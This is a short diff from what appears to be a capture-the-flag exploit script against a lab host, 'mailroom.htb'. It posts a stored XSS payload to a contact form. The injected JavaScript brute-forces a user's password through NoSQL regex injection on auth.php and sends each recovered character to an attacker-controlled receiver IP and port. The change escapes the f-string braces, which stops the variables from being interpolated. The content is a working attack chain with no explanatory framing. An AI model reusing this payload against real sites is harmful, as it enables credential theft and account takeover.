@@ -360,7 +360,7 @@ def make_request(password):
         "email": "",
         "title": "",
     }
-    data["message"] =  f"<script>const alphabet = '{ALPHABET}';const brute = async () => {{ for (var i = 0; i < alphabet.length; i++){{ const currentChar = alphabet[i]; fetch('{STAFF_URL}/auth.php',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'email=tristan@mailroom.htb&password[$regex]=^{quote(password)}'+ alphabet[i] +'.*'}}).then( response => response.text()).then(json => {{ if (json.includes('2FA')){{ fetch('http://{RECIEVE_IP}:{RECIEVE_PORT}/recieve?password={password}'+currentChar) }}}})}}}};brute();</script>"  
+    data["message"] =  f"<script>const alphabet = '{{ALPHABET}}';const brute = async () => {{ for (var i = 0; i < alphabet.length; i++){{ const currentChar = alphabet[i]; fetch('{{STAFF_URL}}/auth.php',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'email=tristan@mailroom.htb&password[$regex]=^{{quote(password)}}'+ alphabet[i] +'.*'}}).then( response => response.text()).then(json => {{ if (json.includes('2FA')){{ fetch('http://{{RECIEVE_IP}}:{{RECIEVE_PORT}}/recieve?password={{password}}'+currentChar) }}}})}}}};brute();</script>"  
 
     requests.post(BASE_URL + "/contact.php",data=data)
 
